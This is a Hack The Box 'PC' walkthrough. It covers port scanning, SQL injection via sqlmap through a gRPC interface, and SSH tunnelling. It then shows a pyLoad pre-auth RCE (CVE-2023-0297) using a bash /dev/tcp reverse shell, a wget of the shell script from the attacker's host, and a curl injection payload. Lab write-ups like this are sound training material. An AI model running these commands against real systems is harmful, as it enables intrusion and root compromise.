---
title: PC Walkthrough - Hackthebox
author: D_C4ptain
date: 2023-06-14 09:36:00 +0300
categories: [hackthebox, walkthrough]
tags: [hackthebox, pc, walkthrough, writeup, privilege escalation, sqlmap, burpsuite, nmap, gRPC, ssh, pyload, netcat, RCE, cve, d_captain, D_C4ptain]
math: true
mermaid: true
image:
  path: /assets/img/posts/htb/pc/pc1.png
---

### Scanning and Enumeration

Let’s do some port scanning.

```bash
nmap -p- 10.10.11.214 --min-rate 1500 -vv -Pn
```

![pc2.png](/assets/img/posts/htb/pc/pc2.png)

We identify a port for ssh and another unknown port.

```bash
sudo nmap -sSVC -p50051,22 10.10.11.214 -vv -Pn
```

![pc3.png](/assets/img/posts/htb/pc/pc3.png)

Checking the ssh service further revealed nothing interesting. 
Looking at the site 10.10.11.214:50051 I found nothing but a bunch of weird characters.

![pc3b.png](/assets/img/posts/htb/pc/pc3b.png)

Decided to google out on port 50051. [link here](https://www.h3c.com/en/d_202212/1731698_294551_0.htm) I found it to be serving a gRPC channel by default.

![pc4.png](/assets/img/posts/htb/pc/pc4.png)

Did some research and found a WEB UI for interacting with gRPC [here.](https://github.com/fullstorydev/grpcui)

I installed it and accessed the gRPC server:

```bash
go/bin/grpcui -plaintext 10.10.11.214:50051
```

I poked several methods on the UI and realized I needed account credentials with some ID and a token to “getinfo”. I tried to log in with an ‘admin’ account and got a token and an ID.

![pc5.png](/assets/img/posts/htb/pc/pc5.png)

Let’s get that ‘info’

![pc6.png](/assets/img/posts/htb/pc/pc6.png)

Nothing useful here!

![pc7.png](/assets/img/posts/htb/pc/pc7.png)

Decided to check the request with burpsuite. Playing around with repeater I attempted IDOR related stuff till I decided to ‘inject’

![pc8.png](/assets/img/posts/htb/pc/pc8.png)

I saved the request for SQLMap.

```bash
sqlmap -r Downloads/grpc.req --batch -a --dump-all
```

Got some creds!

![pc9.png](/assets/img/posts/htb/pc/pc9.png)

### Initial Foothold

Let’s SSH to the machine using the credentials obtained.

![pc10.png](/assets/img/posts/htb/pc/pc10.png)

And we have our flag! kill that rat!

### Privilege Escalation

I checked for vectors like “sudo -l” and binaries with SUID bits but got nothing. Used linpeas and got nothing still.

I decided to check socket statistics with:

```bash
ss -tnl
```

I noticed port 8000 listening on localhost.

![pc11.png](/assets/img/posts/htb/pc/pc11.png)

Let us do SSH tunnelling on it. Read about [SSH tunnelling(SSH portforwarding) here](https://linuxize.com/post/how-to-setup-ssh-tunneling/).

```bash
ssh -L 1337:127.0.0.1:8000 sau@10.10.11.214
```

![pc12.png](/assets/img/posts/htb/pc/pc12.png)

The port 8000 is now accessible to us through port 1337. Let us access in http.

```bash
http://127.0.0.1:1337/
```

![pc13.png](/assets/img/posts/htb/pc/pc13.png)

Found a login page with what looked like a python module. I checked the page source and tried some credentials but that didn’t work.

Checked for any processes linked to pyload:

```bash
ps aux | grep -i pyload
```

![pc15.png](/assets/img/posts/htb/pc/pc15.png)

Found it running as root!

I did some research and found that pyload is susceptible to a pre-authenticated RCE vulnerability **CVE-2023-0297.** [Link here](https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad)

![pc14.png](/assets/img/posts/htb/pc/pc14.png)

I created a bash reverse shell file and uploaded to target machine with python and wget.

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.37/1338 0>&1
```

> On my kali
> 

```bash
python -m http.server 9090 -d Desktop
```

![pc16.png](/assets/img/posts/htb/pc/pc16.png)

> On target:
> 

```bash
wget http://10.10.16.20:9090/rev.sh

chmod +x rev.sh
```

![pc17.png](/assets/img/posts/htb/pc/pc17.png)

Let’s set up a netcat listener and craft our exploit(edit where necessary).

![pc18.png](/assets/img/posts/htb/pc/pc18.png)

```bash
curl -i -s -k -X $'POST' --data-binary $'jk=pyimport%20os;os.system(\"bash%20/home/USER/rev.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' $'http://127.0.0.1:8000/flash/addcrypted2'
```

Let’s go ahead and execute the exploit on target machine.

![pc19.png](/assets/img/posts/htb/pc/pc19.png)

And we get a privileged shell!

![pc20.png](/assets/img/posts/htb/pc/pc20.png)

Go ahead and kill that flag!

Well, There are many ways of killing a rat!

Happy Hacking.